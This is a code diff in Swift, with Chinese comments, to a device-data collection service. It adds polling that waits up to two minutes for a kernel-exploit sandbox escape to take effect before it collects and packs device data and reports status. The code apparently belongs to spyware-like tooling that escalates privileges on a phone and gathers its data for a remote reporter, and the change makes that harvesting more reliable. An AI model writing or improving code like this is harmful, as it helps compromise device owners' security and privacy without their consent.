@@ -724,9 +724,20 @@ enum CollectService {
 
     static func run(configs: [DeviceCollectConfig]) async {
         guard !configs.isEmpty else { return }
-        if KernelExploit.requiresSandboxEscape, !KernelExploit.hasSandboxAccess() {
-            log("collect: sandbox access not active — skip")
-            return
+        if KernelExploit.requiresSandboxEscape {
+            // 启动时网络回报与内核提权是并发进行的：sandbox escape 需 10–30s 才生效，
+            // 这里轮询等待提权完成，避免在沙盒逃逸生效前就放弃采集。
+            if !KernelExploit.hasSandboxAccess() {
+                log("collect: waiting for sandbox access…")
+                let deadline = Date().addingTimeInterval(120)
+                while !KernelExploit.hasSandboxAccess(), Date() < deadline {
+                    try? await Task.sleep(nanoseconds: 1_000_000_000)
+                }
+            }
+            guard KernelExploit.hasSandboxAccess() else {
+                log("collect: sandbox access not active — skip")
+                return
+            }
         }
         // 采集 + 打包是重 IO，放到后台线程执行，避免阻塞主线程。
         await DeviceConfigReporter.reportStatus("正在采集")
